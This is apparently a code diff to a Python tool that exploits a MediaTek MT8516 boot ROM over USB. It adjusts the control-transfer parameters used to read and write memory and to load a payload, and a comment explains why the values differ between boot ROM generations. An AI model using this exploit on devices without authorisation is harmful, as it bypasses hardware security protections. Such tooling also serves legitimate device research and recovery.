@@ -34,17 +34,17 @@ def da_read_write(device, linecode, direction, address, length, data = None, che
 
     for i in range(3):
         device.udev.ctrl_transfer(0x21, 0x20, 0, 0, linecode + array.array('B', to_bytes(ptr_da + 8 - 3 + i, 4, '<')))
-        device.udev.ctrl_transfer(0x80, 0x6, 0x02FF, 0, 9)
+        device.udev.ctrl_transfer(0x80, 0x6, 0x0200, 0, 9)
 
     if address < 0x40:
         for i in range(4):
             device.udev.ctrl_transfer(0x21, 0x20, 0, 0, linecode + array.array('B', to_bytes(ptr_da - 6 + (4 - i), 4, '<')))
-            device.udev.ctrl_transfer(0x80, 0x6, 0x02FF, 0, 9)
+            device.udev.ctrl_transfer(0x80, 0x6, 0x0200, 0, 9)
         return device.cmd_da(direction, address, length, data, check_result)
     else:
         for i in range(3):
             device.udev.ctrl_transfer(0x21, 0x20, 0, 0, linecode + array.array('B', to_bytes(ptr_da - 5 + (3 - i), 4, '<')))
-            device.udev.ctrl_transfer(0x80, 0x6, 0x02FF, 0, 9)
+            device.udev.ctrl_transfer(0x80, 0x6, 0x0200, 0, 9)
         return device.cmd_da(direction, address - 0x40, length, data, check_result)
 
 def p32(x):
@@ -83,7 +83,11 @@ def load_payload(device):
     try:
         ptr_usbdl = 0xd2e4
         payload_address = 0x100A00
-        linecode = device.udev.ctrl_transfer(0xA1, 0x25, 0, 0, 8) + array.array('B', [0])
+        # bypass_utility's 2021 exploit on this exact MT8516 BROM (hw_sub 0x8a00,
+        # hw_ver 0xcb00) used GET_LINE_CODING (0xA1/0x21, 7 bytes) and descriptor
+        # wValue 0x0200.  mtkclient's kamakiri2 parameters (0x25/8B + 0x02FF)
+        # belong to a different BROM generation and hang this one.
+        linecode = device.udev.ctrl_transfer(0xA1, 0x21, 0, 0, 7) + array.array('B', [0])
         try:
             ptr_send = from_bytes(da_read(device, linecode, ptr_usbdl, 4), 4, '<') + 8
         except RuntimeError as error:
